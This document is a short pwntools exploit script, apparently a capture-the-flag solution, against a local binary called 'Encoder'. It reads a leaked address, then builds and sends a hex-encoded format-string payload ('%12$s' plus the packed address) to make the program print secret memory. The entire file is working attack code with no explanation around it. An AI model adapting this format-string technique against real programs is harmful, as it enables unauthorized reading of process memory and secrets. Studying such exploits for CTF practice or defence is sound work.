from pwn import *

def choose(io, num):
    io.sendlineafter('Your choice:', str(num))

def exploit():
    io = process('./Encoder')
    choose(io, 4)
    io.recvline()
    flag = int(io.recvline().strip(), 16)
    print "[*] flag at: {}".format(hex(flag))
    
    payload = '%12$s'.encode('hex')
    payload += '\x00'*6 # multiple of 8 qword
    payload += p64(flag)

    print '[*] payload: {}'.format(payload)
    
    choose(io, 2)
    io.sendline(payload)
    print io.recv()

if __name__ == "__main__":
    exploit()
